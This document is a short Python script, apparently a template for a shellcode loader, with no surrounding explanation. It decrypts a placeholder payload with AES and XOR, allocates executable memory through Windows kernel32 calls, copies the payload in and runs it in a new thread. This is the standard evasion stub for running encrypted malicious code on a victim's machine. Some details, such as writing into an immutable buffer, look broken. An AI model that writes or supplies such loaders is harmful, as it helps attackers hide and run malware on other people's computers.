from ctypes import c_int, windll, pointer, c_char
import hashlib
from Crypto.Cipher import AES
from base64 import b64decode
from itertools import cycle, izip
def xor_decrypt(ciphertext, key):
    decrypted = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in izip(list(b64decode(ciphertext)), cycle(key)))
    return decrypted
class AESDecryptor:
    def __init__(self, key):
        self.key = hashlib.sha256(key.encode('utf-8')).digest()
        self.block_size = AES.block_size
    def decrypt(self, ciphertext):
        iv = b64decode(ciphertext)
        cipher = AES.new(self.key, AES.MODE_CBC, iv[:self.block_size])
        decrypted = cipher.decrypt(iv[self.block_size:]).rstrip(b'\x00').decode('utf-8')
        return decrypted
CIPHER = '---CIPHER---'
PAYLOAD = '---PAYLOAD---'
XORKEY = '---XORKEY---'
aes_decryptor = AESDecryptor(CIPHER)
decrypted_payload = xor_decrypt(aes_decryptor.decrypt(PAYLOAD), XORKEY)
ptr = windll.kernel32.VirtualAlloc(c_int(0), c_int(len(decrypted_payload)), c_int(0x3000), c_int(0x40))
buffer = (c_char * len(decrypted_payload)).from_buffer(decrypted_payload.encode('utf-8'))
windll.kernel32.RtlMoveMemory(c_int(ptr), buffer, c_int(len(decrypted_payload)))
thread = windll.kernel32.CreateThread(c_int(0), c_int(0), c_int(ptr), c_int(0), c_int(0), pointer(c_int(0)))
windll.kernel32.WaitForSingleObject(c_int(thread), c_int(-1))